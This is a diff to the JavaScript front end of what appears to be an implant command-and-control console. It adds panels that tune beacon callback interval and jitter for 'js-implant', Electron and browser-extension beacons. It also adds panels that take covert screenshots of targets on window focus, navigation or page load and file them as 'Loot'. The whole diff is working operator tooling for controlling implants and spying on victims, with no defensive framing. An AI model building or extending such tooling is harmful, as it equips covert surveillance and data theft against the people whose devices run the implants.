@@ -3608,8 +3608,7 @@ async function getClientDetails(id, autoRefresh)
             } else if (client.clientType === 'atom-beacon') {
                 setupBeaconHeaderToggle('Electron');
             } else {
-                removeBeaconHeaderToggle();
-                if (lootHeader) lootHeader.innerHTML = '<b>&nbsp;&nbsp;App Loot</b>';
+                setupBeaconHeaderToggle('App');
             }
         }
 
@@ -3643,11 +3642,10 @@ async function getClientDetails(id, autoRefresh)
             if (client.sidecarSupported) {
                 let sidecarPanel = document.getElementById('sidecar-panel');
                 var isAtomBeacon = client.clientType === 'atom-beacon';
-                var panelTitle = isAtomBeacon ? 'Tools' : 'Sidecar';
+                var panelTitle = isAtomBeacon ? 'OS Tools' : 'Sidecar';
                 var sidecarBadgeHtml;
                 if (isAtomBeacon) {
-                    // Atom-beacon has built-in tools, no sidecar binary
-                    sidecarBadgeHtml = '<span class="badge bg-secondary" id="sidecar-badge">Built-in</span>';
+                    sidecarBadgeHtml = '';
                 } else {
                     sidecarBadgeHtml = client.sidecarConnected
                         ? '<span class="badge bg-success" id="sidecar-badge">Connected</span>'
@@ -3657,39 +3655,8 @@ async function getClientDetails(id, autoRefresh)
                     // Store nickname and beacon id for shell
                     _sidecarShellNickname = client.tag || client.nickname || '';
                     _sidecarShellBeaconId = id;
-                    var screenshotTabHtml = isAtomBeacon ? `
-                                <li class="nav-item">
-                                    <button class="nav-link" data-bs-toggle="tab" data-bs-target="#sidecar-screenshots" type="button">Screenshots</button>
-                                </li>` : '';
-                    var screenshotPaneHtml = isAtomBeacon ? `
-                                <div class="tab-pane fade" id="sidecar-screenshots">
-                                    <div class="mb-3">
-                                        <button class="btn btn-primary btn-sm" id="sidecar-screenshot-btn" onclick="atomCaptureScreenshot('${id}')">Capture Now</button>
-                                        <span id="sidecar-screenshot-status" class="ms-2 small text-muted"></span>
-                                    </div>
-                                    <div class="mb-3 border-top pt-2">
-                                        <div class="form-check form-switch mb-1">
-                                            <input class="form-check-input" type="checkbox" id="atom-ss-on-focus" checked>
-                                            <label class="form-check-label small" for="atom-ss-on-focus">Capture on window focus</label>
-                                        </div>
-                                        <div class="form-check form-switch mb-1">
-                                            <input class="form-check-input" type="checkbox" id="atom-ss-on-navigate" checked>
-                                            <label class="form-check-label small" for="atom-ss-on-navigate">Capture on navigation</label>
-                                        </div>
-                                        <div class="form-check form-switch mb-1">
-                                            <input class="form-check-input" type="checkbox" id="atom-ss-on-newwindow" checked>
-                                            <label class="form-check-label small" for="atom-ss-on-newwindow">Capture on new window</label>
-                                        </div>
-                                        <div class="d-flex align-items-center gap-2 mt-2">
-                                            <label class="small text-muted text-nowrap" for="atom-ss-cooldown">Cooldown (sec):</label>
-                                            <input type="number" class="form-control form-control-sm" id="atom-ss-cooldown" value="30" min="5" max="600" style="width:80px;">
-                                        </div>
-                                    </div>
-                                    <div class="d-flex gap-2">
-                                        <button class="btn btn-outline-success btn-sm" onclick="atomSaveScreenshotSettings('${id}')">Save Settings</button>
-                                        <span id="atom-ss-settings-status" class="small text-muted align-self-center"></span>
-                                    </div>
-                                </div>` : '';
+                    var screenshotTabHtml = '';
+                    var screenshotPaneHtml = '';
 
                     sidecarPanel = document.createElement('div');
                     sidecarPanel.id = 'sidecar-panel';
@@ -3781,6 +3748,16 @@ async function getClientDetails(id, autoRefresh)
             var proxyState = { isActive: false, spoofConfig: {} };
             if (client.clientType === 'bex-beacon' || client.clientType === 'atom-beacon') {
                 try { proxyState = await renderProxyPanel(toolsStack, id, client) || proxyState; } catch(e) { console.error('Proxy panel error:', e); }
+            }
+
+            // Beacon Callback panel for BEX and Atom beacons
+            if (client.clientType === 'bex-beacon' || client.clientType === 'atom-beacon') {
+                try { renderBeaconCallbackPanel(toolsStack, id, client.clientType); } catch(e) { console.error('Beacon Callback panel error:', e); }
+            }
+
+            // Screenshots panel for atom-beacon clients
+            if (client.clientType === 'atom-beacon') {
+                try { renderScreenshotPanel(toolsStack, id); } catch(e) { console.error('Screenshot panel error:', e); }
             }
 
             // Plugin panel for atom-beacon clients
@@ -3980,6 +3957,12 @@ async function getClientDetails(id, autoRefresh)
             } // end bex-beacon domain view else block
         }
 
+        // Tools panels for DOM beacon / App clients
+        if (client && client.clientType === 'js-implant') {
+            try { renderBeaconCallbackPanel(toolsStack, id, 'js-implant'); } catch(e) { console.error('Beacon Callback panel error:', e); }
+            try { renderDomScreenshotPanel(toolsStack, id); } catch(e) { console.error('DOM Screenshot panel error:', e); }
+        }
+
         // Get high level event stack for client (Standard Implant / Atom Beacon)
         var req = await fetch('/api/clientEvents/' + id);
         var jsonResponse = await req.json();
@@ -3994,7 +3977,7 @@ async function getClientDetails(id, autoRefresh)
             newEvents = jsonResponse.filter(e => e.id > lastMaxEventId);
             if (newEvents.length === 0) {
                 // Nothing new — skip entirely, preserve scroll
-                if (client && client.clientType === 'atom-beacon') {
+                if (client && (client.clientType === 'atom-beacon' || client.clientType === 'js-implant')) {
                     switchBexTab(activeBexTab);
                 }
                 return;
@@ -4281,8 +4264,8 @@ async function getClientDetails(id, autoRefresh)
         }
         }
 
-        // Atom-beacon has sidecar tools — enforce tab visibility
-        if (client && client.clientType === 'atom-beacon') {
+        // Enforce tab visibility for clients with tools
+        if (client && (client.clientType === 'atom-beacon' || client.clientType === 'js-implant')) {
             switchBexTab(activeBexTab);
         }
     } finally {
@@ -4387,6 +4370,265 @@ async function renderProxyPanel(cardStack, beaconId, client) {
 }
 
 
+function renderBeaconCallbackPanel(cardStack, beaconId, clientType) {
+    var panel = document.getElementById('beacon-callback-panel');
+    if (panel) return; // Already rendered
+
+    var isAtom = clientType === 'atom-beacon';
+    var isImplant = clientType === 'js-implant';
+    var defaultBase = isAtom ? 2 : (isImplant ? 2 : 60);
+    var defaultJitter = isAtom ? 10 : (isImplant ? 0 : 30);
+
+    panel = document.createElement('div');
+    panel.id = 'beacon-callback-panel';
+    panel.className = 'card mb-3 border-secondary';
+    panel.style.overflow = 'hidden';
+    panel.innerHTML = `
+        <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center" style="cursor:pointer" data-bs-toggle="collapse" data-bs-target="#beacon-callback-collapse" aria-expanded="false" aria-controls="beacon-callback-collapse">
+            <span><b>Beacon Callback</b></span>
+            <svg id="beacon-callback-chevron" width="16" height="16" viewBox="0 0 16 16" fill="currentColor" style="transition: transform 0.25s ease; transform: rotate(-90deg);">
+                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"/>
+            </svg>
+        </div>
+        <div class="collapse" id="beacon-callback-collapse">
+        <div class="card-body p-3">
+            <div class="mb-2 small text-muted" id="beacon-callback-current">Current: loading...</div>
+            <div class="d-flex align-items-center" style="gap:8px">
+                <label class="small text-muted text-nowrap mb-0">Interval:</label>
+                <input type="number" class="form-control form-control-sm" id="beacon-callback-base" value="${defaultBase}" min="0.5" step="0.5" style="width:80px;">
+                <span class="small text-muted">sec</span>
+                <label class="small text-muted text-nowrap mb-0 ms-2">Jitter:</label>
+                <input type="number" class="form-control form-control-sm" id="beacon-callback-jitter" value="${defaultJitter}" min="0" max="100" step="5" style="width:70px;">
+                <span class="small text-muted">%</span>
+                <button class="btn btn-primary btn-sm ms-2" id="beacon-callback-apply-btn">Apply</button>
+                <span class="small ms-2" id="beacon-callback-status"></span>
+            </div>
+        </div>
+        </div>
+    `;
+    cardStack.appendChild(panel);
+
+    // Chevron rotation
+    var collapseEl = document.getElementById('beacon-callback-collapse');
+    if (collapseEl) {
+        collapseEl.addEventListener('hide.bs.collapse', function() {
+            var chev = document.getElementById('beacon-callback-chevron');
+            if (chev) chev.style.transform = 'rotate(-90deg)';
+        });
+        collapseEl.addEventListener('show.bs.collapse', function() {
+            var chev = document.getElementById('beacon-callback-chevron');
+            if (chev) chev.style.transform = 'rotate(0deg)';
+        });
+    }
+
+    // Fetch current heartbeat values
+    var baseInput = document.getElementById('beacon-callback-base');
+    var jitterInput = document.getElementById('beacon-callback-jitter');
+    var currentEl = document.getElementById('beacon-callback-current');
+    var defaultLabel = defaultBase + 's / ' + defaultJitter + '% jitter (defaults)';
+
+    fetch('/api/beacon/heartbeat/' + beaconId).then(function(r) { return r.json(); }).then(function(resp) {
+        if (resp.found && resp.data) {
+            var d = resp.data;
+            if (baseInput) baseInput.value = d.baseInterval;
+            if (jitterInput) jitterInput.value = d.jitterPercent;
+            if (currentEl) currentEl.textContent = 'Current: ' + d.baseInterval + 's / ' + d.jitterPercent + '% jitter';
+        } else {
+            if (currentEl) currentEl.textContent = 'Current: ' + defaultLabel;
+        }
+    }).catch(function() {
+        if (currentEl) currentEl.textContent = 'Current: unable to fetch';
+    });
+
+    // Apply button
+    var applyBtn = document.getElementById('beacon-callback-apply-btn');
+    var statusEl = document.getElementById('beacon-callback-status');
+    var _hbPollTimer = null;
+    var _lastResultId = null;
+
+    // Store the last known result ID so we can detect new results
+    fetch('/api/beacon/heartbeat/' + beaconId).then(function(r) { return r.json(); }).then(function(resp) {
+        if (resp.found) _lastResultId = resp.id;
+    }).catch(function() {});
+
+    if (applyBtn) {
+        applyBtn.onclick = function() {
+            var base = parseFloat(baseInput ? baseInput.value : String(defaultBase));
+            var jitter = parseFloat(jitterInput ? jitterInput.value : String(defaultJitter));
+            if (isNaN(base) || base < 0.5) { if (statusEl) statusEl.innerHTML = '<span style="color:#ee5f5b">Min 0.5s</span>'; return; }
+            if (isNaN(jitter) || jitter < 0 || jitter > 100) { if (statusEl) statusEl.innerHTML = '<span style="color:#ee5f5b">Jitter 0-100</span>'; return; }
+
+            fetch('/api/beacon/heartbeat', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ clientID: beaconId, baseInterval: base, jitterPercent: jitter })
+            }).then(function(r) {
+                if (!r.ok) throw new Error('Failed to queue');
+                return r.json();
+            }).then(function() {
+                if (statusEl) statusEl.innerHTML = '<span class="text-muted"><span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.65rem;height:0.65rem"></span>Queued...</span>';
+
+                var polls = 0;
+                if (_hbPollTimer) clearInterval(_hbPollTimer);
+                _hbPollTimer = setInterval(function() {
+                    polls++;
+                    if (polls > 15) {
+                        clearInterval(_hbPollTimer);
+                        _hbPollTimer = null;
+                        if (statusEl) statusEl.innerHTML = '<span style="color:#ee5f5b">Timed out</span>';
+                        return;
+                    }
+                    fetch('/api/beacon/heartbeat/' + beaconId).then(function(r) { return r.json(); }).then(function(resp) {
+                        if (resp.found && resp.id !== _lastResultId) {
+                            clearInterval(_hbPollTimer);
+                            _hbPollTimer = null;
+                            _lastResultId = resp.id;
+                            var d = resp.data;
+                            if (d.success) {
+                                if (baseInput) baseInput.value = d.baseInterval;
+                                if (jitterInput) jitterInput.value = d.jitterPercent;
+                                if (currentEl) currentEl.textContent = 'Current: ' + d.baseInterval + 's / ' + d.jitterPercent + '% jitter';
+                                if (statusEl) statusEl.innerHTML = '<span style="color:#62c462">Applied: ' + d.baseInterval + 's / ' + d.jitterPercent + '%</span>';
+                            } else {
+                                if (statusEl) statusEl.innerHTML = '<span style="color:#ee5f5b">' + (d.error || 'Failed') + '</span>';
+                            }
+                        }
+                    }).catch(function() {});
+                }, 1000);
+            }).catch(function(e) {
+                if (statusEl) statusEl.innerHTML = '<span style="color:#ee5f5b">Error: ' + e.message + '</span>';
+            });
+        };
+    }
+}
+
+function renderScreenshotPanel(cardStack, beaconId) {
+    var panel = document.getElementById('screenshot-panel');
+    if (panel) return; // Already rendered
+
+    panel = document.createElement('div');
+    panel.id = 'screenshot-panel';
+    panel.className = 'card mb-3 border-secondary';
+    panel.style.overflow = 'hidden';
+    panel.innerHTML = `
+        <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center" style="cursor:pointer" data-bs-toggle="collapse" data-bs-target="#screenshot-collapse" aria-expanded="false" aria-controls="screenshot-collapse">
+            <span><b>Screenshots</b></span>
+            <svg id="screenshot-chevron" width="16" height="16" viewBox="0 0 16 16" fill="currentColor" style="transition: transform 0.25s ease; transform: rotate(-90deg);">
+                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"/>
+            </svg>
+        </div>
+        <div class="collapse" id="screenshot-collapse">
+        <div class="card-body p-3">
+            <div class="mb-3">
+                <button class="btn btn-primary btn-sm" id="sidecar-screenshot-btn" onclick="atomCaptureScreenshot('${beaconId}')">Capture Now</button>
+                <span id="sidecar-screenshot-status" class="ms-2 small text-muted"></span>
+            </div>
+            <div class="mb-3 border-top pt-2">
+                <div class="form-check form-switch mb-1">
+                    <input class="form-check-input" type="checkbox" id="atom-ss-on-focus" checked>
+                    <label class="form-check-label small" for="atom-ss-on-focus">Capture on window focus</label>
+                </div>
+                <div class="form-check form-switch mb-1">
+                    <input class="form-check-input" type="checkbox" id="atom-ss-on-navigate" checked>
+                    <label class="form-check-label small" for="atom-ss-on-navigate">Capture on navigation</label>
+                </div>
+                <div class="form-check form-switch mb-1">
+                    <input class="form-check-input" type="checkbox" id="atom-ss-on-newwindow" checked>
+                    <label class="form-check-label small" for="atom-ss-on-newwindow">Capture on new window</label>
+                </div>
+                <div class="d-flex align-items-center gap-2 mt-2">
+                    <label class="small text-muted text-nowrap" for="atom-ss-cooldown">Cooldown (sec):</label>
+                    <input type="number" class="form-control form-control-sm" id="atom-ss-cooldown" value="30" min="5" max="600" style="width:80px;">
+                </div>
+            </div>
+            <div class="d-flex gap-2">
+                <button class="btn btn-secondary btn-sm" onclick="atomSaveScreenshotSettings('${beaconId}')">Save Settings</button>
+                <span id="atom-ss-settings-status" class="small text-muted align-self-center"></span>
+            </div>
+        </div>
+        </div>
+    `;
+    cardStack.appendChild(panel);
+
+    // Chevron rotation
+    var collapseEl = document.getElementById('screenshot-collapse');
+    if (collapseEl) {
+        collapseEl.addEventListener('hide.bs.collapse', function() {
+            var chev = document.getElementById('screenshot-chevron');
+            if (chev) chev.style.transform = 'rotate(-90deg)';
+        });
+        collapseEl.addEventListener('show.bs.collapse', function() {
+            var chev = document.getElementById('screenshot-chevron');
+            if (chev) chev.style.transform = 'rotate(0deg)';
+        });
+    }
+}
+
+function renderDomScreenshotPanel(cardStack, clientId) {
+    var panel = document.getElementById('dom-screenshot-panel');
+    if (panel) return; // Already rendered
+
+    panel = document.createElement('div');
+    panel.id = 'dom-screenshot-panel';
+    panel.className = 'card mb-3 border-secondary';
+    panel.style.overflow = 'hidden';
+    panel.innerHTML = `
+        <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center" style="cursor:pointer" data-bs-toggle="collapse" data-bs-target="#dom-screenshot-collapse" aria-expanded="false" aria-controls="dom-screenshot-collapse">
+            <span><b>Screenshots</b></span>
+            <svg id="dom-screenshot-chevron" width="16" height="16" viewBox="0 0 16 16" fill="currentColor" style="transition: transform 0.25s ease; transform: rotate(-90deg);">
+                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"/>
+            </svg>
+        </div>
+        <div class="collapse" id="dom-screenshot-collapse">
+        <div class="card-body p-3">
+            <div class="mb-2">
+                <button class="btn btn-primary btn-sm" id="dom-screenshot-btn">Capture Now</button>
+                <span id="dom-screenshot-status" class="ms-2 small text-muted"></span>
+            </div>
+            <div class="small text-muted">Triggers an html2canvas screenshot on the target page. The result appears as a SCREENSHOT event in the Loot tab.</div>
+        </div>
+        </div>
+    `;
+    cardStack.appendChild(panel);
+
+    // Chevron rotation
+    var collapseEl = document.getElementById('dom-screenshot-collapse');
+    if (collapseEl) {
+        collapseEl.addEventListener('hide.bs.collapse', function() {
+            var chev = document.getElementById('dom-screenshot-chevron');
+            if (chev) chev.style.transform = 'rotate(-90deg)';
+        });
+        collapseEl.addEventListener('show.bs.collapse', function() {
+            var chev = document.getElementById('dom-screenshot-chevron');
+            if (chev) chev.style.transform = 'rotate(0deg)';
+        });
+    }
+
+    // Capture button
+    var btn = document.getElementById('dom-screenshot-btn');
+    if (btn) {
+        btn.onclick = function() {
+            btn.disabled = true;
+            var status = document.getElementById('dom-screenshot-status');
+            fetch('/api/dom/screenshot', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ clientID: clientId })
+            }).then(function(r) {
+                if (!r.ok) throw new Error('Failed to queue');
+                return r.json();
+            }).then(function() {
+                if (status) status.innerHTML = '<span class="text-muted">Queued &mdash; will appear in Loot tab on next heartbeat</span>';
+                btn.disabled = false;
+            }).catch(function(err) {
+                if (status) status.innerHTML = '<span style="color:#ee5f5b">Error: ' + err.message + '</span>';
+                btn.disabled = false;
+            });
+        };
+    }
+}
+
+
 async function renderPluginPanel(cardStack, beaconId, client) {
     var panel = document.getElementById('plugin-panel');
 
@@ -4416,6 +4658,7 @@ async function renderPluginPanel(cardStack, beaconId, client) {
         panel = document.createElement('div');
         panel.id = 'plugin-panel';
         panel.className = 'card mb-3 border-secondary';
+        panel.style.overflow = 'hidden';
         cardStack.appendChild(panel);
     }
 
@@ -4441,38 +4684,55 @@ async function renderPluginPanel(cardStack, beaconId, client) {
                 var setting = p.settings[s];
                 var defaultVal = setting.default !== undefined ? setting.default : '';
                 settingsHtml += '<div class="mb-1"><label class="form-label small mb-0">' + escapeHTML(setting.label) + '</label>';
-                settingsHtml += '<input class="form-control form-control-sm" data-setting-key="' + escapeHTML(setting.key) + '" type="' + (setting.type === 'number' ? 'number' : 'text') + '" value="' + escapeHTML(String(defaultVal)) + '"></div>';
+                settingsHtml += '<input class="form-control form-control-sm" style="max-width:260px" data-setting-key="' + escapeHTML(setting.key) + '" type="' + (setting.type === 'number' ? 'number' : 'text') + '" value="' + escapeHTML(String(defaultVal)) + '"></div>';
             }
             settingsHtml += '</div>';
         }
 
-        pluginListHtml += '<div class="d-flex justify-content-between align-items-start border-bottom border-secondary py-2">' +
-            '<div class="flex-grow-1">' +
-            '<div class="d-flex align-items-center gap-2"><b>' + escapeHTML(p.name) + '</b> ' + statusBadge +
+        pluginListHtml += '<div class="card border-secondary mb-2" style="background:#272b30">' +
+            '<div class="card-body p-2">' +
+            '<div class="d-flex justify-content-between align-items-center">' +
+            '<div class="d-flex align-items-center gap-2"><b class="text-white">' + escapeHTML(p.name) + '</b> ' + statusBadge +
             ' <span class="text-muted small">v' + escapeHTML(p.version || '?') + '</span></div>' +
-            '<div class="small text-muted">' + escapeHTML(p.description || '') + '</div>' +
-            (targetApps ? '<div class="small text-muted">Targets: ' + targetApps + '</div>' : '') +
-            settingsHtml +
-            '</div>' +
             '<div class="ms-2">' + actionBtn + '</div>' +
-            '</div>';
-
-        // If active and has UI, add a container for it
-        if (isActive && p.capabilities && p.capabilities.ui) {
-            pluginListHtml += '<div class="plugin-ui-container p-2" id="plugin-ui-' + escapeHTML(p.id) + '"></div>';
-        }
+            '</div>' +
+            (isActive ? '<div class="small text-muted mt-1">' + escapeHTML(p.description || '') + '</div>' : '') +
+            (isActive && targetApps ? '<div class="small text-muted">Targets: ' + targetApps + '</div>' : '') +
+            settingsHtml +
+            (isActive && p.capabilities && p.capabilities.ui ? '<div class="plugin-ui-container p-2 mt-2" id="plugin-ui-' + escapeHTML(p.id) + '"></div>' : '') +
+            '</div></div>';
     }
 
     // Store active state for skip-rebuild check
     var activeStateKey = activePlugins.map(function(a) { return a.pluginId; }).sort().join(',');
     panel.setAttribute('data-active-state', activeStateKey);
 
+    var isExpanded = panel.hasAttribute('data-expanded');
     panel.innerHTML =
-        '<div class="card-header bg-dark text-white d-flex justify-content-between align-items-center">' +
+        '<div class="card-header bg-dark text-white d-flex justify-content-between align-items-center" style="cursor:pointer" data-bs-toggle="collapse" data-bs-target="#plugin-collapse" aria-expanded="' + (isExpanded ? 'true' : 'false') + '" aria-controls="plugin-collapse">' +
         '<span><b>Atom Plugins</b></span>' +
+        '<div class="d-flex align-items-center gap-2">' +
         '<span class="badge bg-info plugin-count-badge">' + activeCount + ' / ' + allPlugins.length + '</span>' +
+        '<svg id="plugin-chevron" width="16" height="16" viewBox="0 0 16 16" fill="currentColor" style="transition: transform 0.25s ease; transform: rotate(' + (isExpanded ? '0' : '-90') + 'deg);"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"/></svg>' +
         '</div>' +
-        '<div class="card-body p-3">' + pluginListHtml + '</div>';
+        '</div>' +
+        '<div class="collapse' + (isExpanded ? ' show' : '') + '" id="plugin-collapse">' +
+        '<div class="card-body p-3">' + pluginListHtml + '</div></div>';
+
+    // Chevron rotation on collapse/expand
+    var pluginCollapseEl = document.getElementById('plugin-collapse');
+    if (pluginCollapseEl) {
+        pluginCollapseEl.addEventListener('show.bs.collapse', function() {
+            var chev = document.getElementById('plugin-chevron');
+            if (chev) chev.style.transform = 'rotate(0deg)';
+            panel.setAttribute('data-expanded', '1');
+        });
+        pluginCollapseEl.addEventListener('hide.bs.collapse', function() {
+            var chev = document.getElementById('plugin-chevron');
+            if (chev) chev.style.transform = 'rotate(-90deg)';
+            panel.removeAttribute('data-expanded');
+        });
+    }
 
     // Wire up activate buttons
     var activateBtns = panel.querySelectorAll('.plugin-activate-btn');
@@ -4953,8 +5213,13 @@ async function updateClients()
     } else if (activeType === 'electrons') {
         setupBeaconHeaderToggle('Electron');
     } else {
-        removeBeaconHeaderToggle();
-        if (lootHeader) lootHeader.innerHTML = '<b>&nbsp;&nbsp;App Loot</b>';
+        // If an App client is selected, keep the Loot/Tools toggle; otherwise plain label
+        if (selectedClientId) {
+            setupBeaconHeaderToggle('App');
+        } else {
+            removeBeaconHeaderToggle();
+            if (lootHeader) lootHeader.innerHTML = '<b>&nbsp;&nbsp;App Loot</b>';
+        }
     }
 
 	var topCount = parseInt(clientLoadCount) + parseInt(clientLoadExtraCount);
